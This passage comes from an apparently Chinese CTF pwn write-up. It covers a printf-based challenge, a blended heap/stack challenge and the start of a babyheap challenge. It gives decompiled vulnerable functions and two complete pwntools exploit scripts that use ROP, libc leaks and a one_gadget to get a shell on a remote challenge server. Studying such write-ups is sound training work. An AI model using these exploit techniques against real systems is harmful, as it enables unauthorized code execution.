<span class="number">2435</span>, <span class="string">&quot;%16$c%1$00224s%2$c%4$s%1$02246s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2472</span>, <span class="string">&quot;%1$02510s%3$hn%1$63026s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2510</span>, <span class="string">&quot;%18$c%1$00149s%2$c%4$s%1$02396s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2547</span>, <span class="string">&quot;%1$02585s%3$hn%1$62951s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2585</span>, <span class="string">&quot;%20$c%1$00074s%2$c%4$s%1$02546s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2622</span>, <span class="string">&quot;%1$02660s%3$hn%1$62876s%1$00004s%6$hn&quot;</span>, <span class="number">0x26</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2660</span>, <span class="string">&quot;%22$c%1$65535s%2$c%4$s%1$02696s%3$hn&quot;</span>, <span class="number">0x25</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)dest + <span class="number">2697</span>, <span class="string">&quot;%1$65534s%3$hn&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  v9 = <span class="number">0L</span>L;</span><br><span class="line">  v8 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  format = (<span class="keyword">char</span> *)dest;</span><br><span class="line">  vul_size = (<span class="keyword">unsigned</span> __int16 *)dest;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What the f**k printf?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to input something&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You will find this game very interesting&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )                   <span class="comment">// input 16 times</span></span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">char</span> *)dest + <span class="number">8</span> * i + <span class="number">57344</span>);</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">char</span> *)dest + <span class="number">65534</span> != format )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(</span><br><span class="line">      (<span class="keyword">char</span> *)<span class="number">0x6000000</span>,</span><br><span class="line">      format,</span><br><span class="line">      &amp;v13,</span><br><span class="line">      <span class="number">0L</span>L,</span><br><span class="line">      &amp;format,</span><br><span class="line">      <span class="number">100663296L</span>L,</span><br><span class="line">      *vul_size,</span><br><span class="line">      vul_size,</span><br><span class="line">      &amp;vul_size,</span><br><span class="line">      v11,</span><br><span class="line">      &amp;v11,</span><br><span class="line">      v10,</span><br><span class="line">      &amp;v10,</span><br><span class="line">      v9,</span><br><span class="line">      &amp;v9,</span><br><span class="line">      v8,</span><br><span class="line">      &amp;v8,</span><br><span class="line">      v7,</span><br><span class="line">      &amp;v7,</span><br><span class="line">      v6,</span><br><span class="line">      &amp;v6,</span><br><span class="line">      v5,</span><br><span class="line">      &amp;v5,</span><br><span class="line">      v4,</span><br><span class="line">      &amp;v4);</span><br><span class="line">    ++v16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *vul_size &lt;= <span class="number">0x20</span>u )</span><br><span class="line">    read_vul(*vul_size);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please try again and you will get it&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sorry you are out&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一堆格式化字符串，输入一些数值, 会取出相应的字符串来进行格式化处理，在处理完之后，调用输入函数，输入函数如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">read_vul</span><span class="params">(<span class="keyword">unsigned</span> __int16 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;savedregs, <span class="number">2</span> * a1);           <span class="comment">// vul</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进行第9次输入的时候，输入的值直接可修改size变量，修改为大于0x5的即可实现堆栈溢出，直接采用ret2libc打法。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;pwn_printf&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;47.111.96.55&quot;</span></span><br><span class="line">server_port = <span class="number">54506</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">		sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="number">0x20</span>)) <span class="comment"># set size</span></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	pop_rdi = <span class="number">0x401213</span></span><br><span class="line">	start = <span class="number">0x4007EF</span></span><br><span class="line">	vul_read = <span class="number">0x4007C6</span></span><br><span class="line">	p = p64(<span class="number">0</span>) <span class="comment"># rbp</span></span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(<span class="number">0x40</span>)</span><br><span class="line">	p += p64(vul_read)</span><br><span class="line">	s(p)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - <span class="number">0x0f7310</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	db()</span><br><span class="line">	p = p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(libc_base + <span class="number">0x18ce17</span>)</span><br><span class="line">	p += p64(libc_base + <span class="number">0x0453a0</span>)</span><br><span class="line">	s(p)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>







<h2 id="pwn2-blend-pwn"><a href="#pwn2-blend-pwn" class="headerlink" title="pwn2  [blend_pwn]"></a>pwn2  [blend_pwn]</h2><p>该程序漏洞比较多，需要各个漏洞结合起来打。</p>
<h3 id="vul1"><a href="#vul1" class="headerlink" title="vul1"></a>vul1</h3><p>字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(byte_202080);                   <span class="comment">// vul</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="vul2"><a href="#vul2" class="headerlink" title="vul2"></a>vul2</h3><p>uaf漏洞，释放内存后指针没有清0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index&gt;&quot;</span>);</span><br><span class="line">  index = input_n();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Insufficient space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr_arr[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr_arr[index]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;down!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="vul3"><a href="#vul3" class="headerlink" title="vul3"></a>vul3</h3><p>堆栈溢出可修改rbp，在捕获异常后可实现堆栈迁移。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h] vul</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input what you want:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)readn(&amp;v2, <span class="number">0x28</span>) &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (_QWORD *)_cxa_allocate_exception(<span class="number">8L</span>L);</span><br><span class="line">    *v0 = <span class="string">&quot;You are too young!&quot;</span>;</span><br><span class="line">    _cxa_throw((__int64)v0, (__int64)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="keyword">char</span> <span class="keyword">const</span>*, <span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;blend_pwn&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;~/pwn-lib/2.23&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;47.111.96.55&quot;</span></span><br><span class="line">server_port = <span class="number">52704</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shu</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;want:&#x27;</span>, d)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	dp()</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%p%p&#x27;</span>)</span><br><span class="line">	shu()</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	libc_base = leak - <span class="number">0x3c6780</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0x45226</span></span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line">	ad(p)</span><br><span class="line">	ad(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	<span class="comment"># leak heap</span></span><br><span class="line">	ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	heap_leak = u64(ru(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">	</span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">	p += p64(heap_leak + <span class="number">0x20</span>)</span><br><span class="line">	p += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x9</span></span><br><span class="line">	gift(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>





<h2 id="pwn3-babyheap"><a href="#pwn3-babyheap" class="headerlink" title="pwn3 [babyheap]"></a>pwn3 [babyheap]</h2><p>保护</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>



<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><p>off by null漏洞</p>
